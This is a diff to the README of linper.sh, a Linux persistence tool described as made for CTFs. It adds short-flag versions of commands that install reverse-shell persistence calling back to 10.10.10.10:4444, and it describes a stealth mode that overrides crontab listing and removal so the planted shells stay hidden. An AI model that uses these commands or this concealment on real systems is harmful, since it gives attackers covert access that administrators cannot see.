@@ -20,14 +20,17 @@ This was developed with CTFs in mind and that is its intended use case. The stea
 Enumerate all persistence methods and install
 
 `bash linper.sh --rhost 10.10.10.10 --rport 4444`
+`bash linper.sh -i 10.10.10.10 -p 4444`
 
 Enumerate and do not install
 
+`bash linper.sh --dryrun`
 `bash linper.sh -d`
 
 Enumerate all persistence methods and install (stealth mode)
 
 `bash linper.sh --rhost 10.10.10.10 --rport 4444 --stealth-mode`
+`bash linper.sh -i 10.10.10.10 -p 4444 -s`
 
 ## methodology
 
@@ -47,8 +50,8 @@ Enumerate all persistence methods and install (stealth mode)
 
 2. Disables the ability to append methods to the bashrc - because if a connection fails it is noisy and prints to the screen
 
-3. Creates a `crontab` function in \~/.bash_aliases to override the `-r` and `-l` flags. `-r` is changed to remove all crontab entries <u>except</u> your reverse shells. `-l` is changed to list all the existing cron jobs <u>except</u> your reverse shells.
+3. Creates a `crontab` function in \~/.bash\_aliases to override the `-r` and `-l` flags. `-r` is changed to remove all crontab entries <u>except</u> your reverse shells. `-l` is changed to list all the existing cron jobs <u>except</u> your reverse shells.
 
 ### known limitation
 
-1. If you run `--stealth-mode` as a sudo enabled user, be aware that you can bypass the `crontab` function installed in \~/.bash_aliases because aliases are not preserved when running `sudo`, nor does `sudo` call the `root` user aliases. (This does not interfere with the sudo hijack attack)
+1. If you run `--stealth-mode` as a sudo enabled user, be aware that you can bypass the `crontab` function installed in \~/.bash\_aliases because aliases are not preserved when running `sudo`, nor does `sudo` call the `root` user aliases. (This does not interfere with the sudo hijack attack)
